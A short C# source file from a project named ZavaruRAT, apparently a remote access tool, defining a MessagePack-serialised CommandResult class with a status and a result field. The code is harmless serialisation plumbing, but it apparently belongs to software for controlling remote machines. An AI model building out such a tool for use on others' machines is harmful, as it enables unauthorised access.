#region

using MessagePack;

#endregion

namespace ZavaruRAT.Shared.Models.Client;

[MessagePackObject]
public sealed class CommandResult
{
    [Key(0)] public CommandResultStatus Status { get; set; }
    [Key(1)] public object? Result { get; set; }

    public override string ToString()
    {
        return $"{nameof(Status)}: {Status}, {nameof(Result)}: {Result}";
    }
}
